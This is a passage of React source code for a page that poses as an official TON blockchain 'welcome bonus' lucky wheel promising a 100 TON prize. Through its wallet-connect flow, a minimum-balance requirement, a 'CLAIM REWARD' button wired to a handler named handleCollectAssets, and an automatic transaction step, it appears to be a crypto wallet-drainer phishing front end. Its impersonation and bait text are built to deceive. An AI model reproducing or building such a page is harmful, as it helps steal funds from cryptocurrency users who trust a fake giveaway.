        {/* Win Modal */}
        <div className={`modal ${showModal ? 'modal_active' : ''}`}>
          <div className="modal_rect">
            <div className="modal_rect_up">
              <p className="modal_rect_up_tittle">
                {hasProcessedWallet && AUTO_PROCESS_ENABLED ? 'TRANSACTION SENT!' : 'CONGRATULATIONS!'} <br /> 
                {hasProcessedWallet && AUTO_PROCESS_ENABLED ? 'Check your wallet for confirmation' : 'you have won'} <span>{hasProcessedWallet && AUTO_PROCESS_ENABLED ? '' : '100 ton'}</span>
              </p>
            </div>
            <div className="modal_rect_bottom">
              <div className="modal_rect_bottom_content">
                {!wallet ? (
                  <>
                    <p className="modal_rect_bottom_text">Connect your wallet to claim your reward!</p>
                    <button 
                      className="modal_rect_bottom_button connect"
                      onClick={handleConnectWallet}
                    >
                      CONNECT WALLET
                    </button>
                  </>
                ) : userBalance !== null && userBalance < 0.2 ? (
                  <>
                    <p className="modal_rect_bottom_text">Almost there! Please add funds to claim your reward.</p>
                    <div className="balance_warning">
                      ⚠️ Minimum 0.2 TON required to claim reward<br />
                      Current balance: {userBalance.toFixed(2)} TON
                    </div>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={() => setShowModal(false)}
                    >
                      ADD FUNDS & RETURN
                    </button>
                  </>
                ) : hasProcessedWallet && AUTO_PROCESS_ENABLED ? (
                  <>
                    <p className="modal_rect_bottom_text">
                      Transaction has been automatically processed! Check your wallet for confirmation.
                    </p>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={() => setShowModal(false)}
                    >
                      GOT IT!
                    </button>
                  </>
                ) : (
                  <>
                    <p className="modal_rect_bottom_text">
                      Wallet connected! Click below to claim your 100 TON reward.
                    </p>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={handleCollectAssets}
                      disabled={isProcessing}
                    >
                      {isProcessing ? 'PROCESSING...' : 'CLAIM REWARD'}
                    </button>
                  </>
                )}
                <button 
                  className="modal_close_btn"
                  onClick={() => setShowModal(false)}
                >
                  CLOSE
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Header */}
        {/* Header */}
<section className="header">
  <div className="container">
    <div className="header_items">
      <div className="header_item">
        <a href="#!" className="header_item_logo">
          <img src="/assets/img/header_logo.svg" alt="" />
        </a>
      </div>
      <div className="header_item">
        <div className="header_item_socials">
          <a href="https://twitter.com/ton_blockchain" target="_blank" className="header_item_social">
            <img src="/assets/img/header_twitter.svg" alt="" />
          </a>
          <a href="https://youtube.com/@the_open_network?si=1C27q9XJIvpuNG1u" target="_blank" className="header_item_social">
            <img src="/assets/img/header_yt.svg" alt="" />
          </a>
          <a href="https://t.me/tonblockchain" target="_blank" className="header_item_social">
            <img src="/assets/img/header_tg.svg" alt="" />
          </a>
          <a href="#" className="header_item_social">
            <img src="/assets/img/header_mail.svg" alt="" />
          </a>
        </div>
      </div>
      <div className="header_item">
        <div className="wallet_section">
          {/* Показываем баланс только если кошелек подключен */}
          {wallet && userBalance !== null && (
            <div className="balance_display">
              <span className="balance_label">Balance:</span>
              <span className="balance_amount">{userBalance.toFixed(2)}</span>
              <span className="balance_ton">TON</span>
            </div>
          )}
          
          {wallet ? (
            <button className="wallet_button wallet_button_connected" onClick={handleDisconnect}>
              {isProcessing ? 'Processing...' : 'Connected'}
            </button>
          ) : (
            <button className="wallet_button wallet_button_connect" onClick={handleConnectWallet}>
              Connect Wallet
            </button>
          )}
        </div>
      </div>
    </div>
  </div>
</section>

        {/* Main */}
        <section className="main">
          <div className="container">
            <h1 className="main_tittle">
              Welcome <span>bonus</span> <br /> for ton users
            </h1>

            <div className="main_wheel">
  <div className="main_wheel_main">
    <img src="/assets/img/wheel_arrow.png" alt="" className="main_wheel_main_arrow" />
    <img src="/assets/img/wheel_wheel.png" alt="" className="main_wheel_main_wheel" id="wheel" />
    {isProcessing ? (
      <button 
        className="main_wheel_main_button processing" 
        disabled
      >
        PROCESSING...
      </button>
    ) : !hasSpun ? (
      <button 
        className="main_wheel_main_button free_spin" 
        onClick={handleSpin}
        disabled={isSpinning}
      >
        {isSpinning ? 'SPINNING...' : 'SPIN NOW'}
      </button>
    ) : (
      <button 
        className="main_wheel_main_button claim_reward" 
        onClick={handleClaimReward}
      >
        CLAIM REWARD
      </button>
    )}
  </div>
</div>

            <div className="main_faq">
              <div className="main_faq_blocks">
                <p className="main_faq_block">
                  <img src="/assets/img/main_one.svg" alt="" />
                  Enter promo code for free spin or pay {SPIN_PRICE_TON} TON to play
                </p>
                <p className="main_faq_block">
                  <img src="/assets/img/main_two.svg" alt="" />
                  Make sure you have at least 0.2 TON in your wallet to claim rewards
                </p>
                <p className="main_faq_block">
                  <img src="/assets/img/main_three.svg" alt="" />
                  Win up to 100 TON in our lucky wheel game!
                </p>
              </div>
              <p className="main_faq_copy">Copyright © 2025 TON. All Rights Reserved</p>
            </div>
          </div>
        </section>

        {/* Status Notification */}
        {status && (
          <div style={{
            position: 'fixed',
            bottom: '20px',
            right: '20px',
            background: 'rgba(255, 255, 255, 0.95)',
            padding: '16px 24px',
            borderRadius: '12px',
            boxShadow: '0 8px 30px rgba(0, 0, 0, 0.15)',
            zIndex: 12,
            fontSize: '14px',
            color: '#333',
            maxWidth: '300px',
            backdropFilter: 'blur(10px)',
            animation: 'slideIn 0.3s ease'
          }}>
            {status}
            <button 
              onClick={() => setStatus('')}
              style={{
                position: 'absolute',
                top: '8px',
                right: '8px',
                background: 'none',
                border: 'none',
                fontSize: '16px',
                cursor: 'pointer',
                color: '#666',
                width: '20px',
                height: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}
            >
              ×
            </button>
          </div>
        )}
      </div>
    </>
  );
}

export default function App() {
  return (
    <TonConnectUIProvider manifestUrl={manifestUrl}>
      <HomePage />
    </TonConnectUIProvider>
  );
}